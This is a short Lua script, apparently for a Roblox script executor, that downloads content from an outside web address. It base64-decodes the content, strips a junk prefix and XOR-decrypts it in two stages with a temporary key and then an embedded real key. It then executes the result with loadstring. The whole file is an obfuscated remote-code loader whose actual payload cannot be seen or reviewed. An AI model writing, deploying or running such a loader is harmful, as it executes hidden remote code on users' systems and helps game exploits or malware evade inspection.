local HttpService = game:GetService("HttpService")

local TEMP_KEY = "bootstrap_xor_v1"

local function http_request(opts)
    if http and http.request then
        return http.request(opts)
    elseif request then
        return request(opts)
    else
        return {
            Body = HttpService:GetAsync(opts.Url),
            StatusCode = 200
        }
    end
end

local function xor_decrypt(data, key)
    local out = {}
    for i = 1, #data do
        out[i] = string.char(
            bit32.bxor(
                data:byte(i),
                key:byte((i - 1) % #key + 1)
            )
        )
    end
    return table.concat(out)
end

-- FETCH
local res = http_request({
    Url = "https://lunoria-one.vercel.app/loader",
    Method = "GET"
})

if not res.Body then return end

-- BASE64 DECODE
local raw = crypt.base64decode(res.Body)

-- UNWRAP JUNK
local prefix_len = raw:byte(1) * 256 + raw:byte(2)
local len_pos = 3 + prefix_len

local len = 0
for i = len_pos, len_pos + 3 do
    len = len * 256 + raw:byte(i)
end

local payload_start = len_pos + 4
local encrypted = raw:sub(payload_start, payload_start + len - 1)

-- STAGE 1 (TEMP KEY)
local stage1 = xor_decrypt(encrypted, TEMP_KEY)

-- EXTRACT REAL KEY
local key_b64 = stage1:match('local XOR_KEY="([^"]+)"')
if not key_b64 then return end

local real_key = crypt.base64decode(key_b64)

-- STAGE 2 (REAL KEY)
local final = xor_decrypt(stage1, real_key)

-- EXECUTE
local fn, err = loadstring(final)
if not fn then
    warn(err)
    return
end

fn()
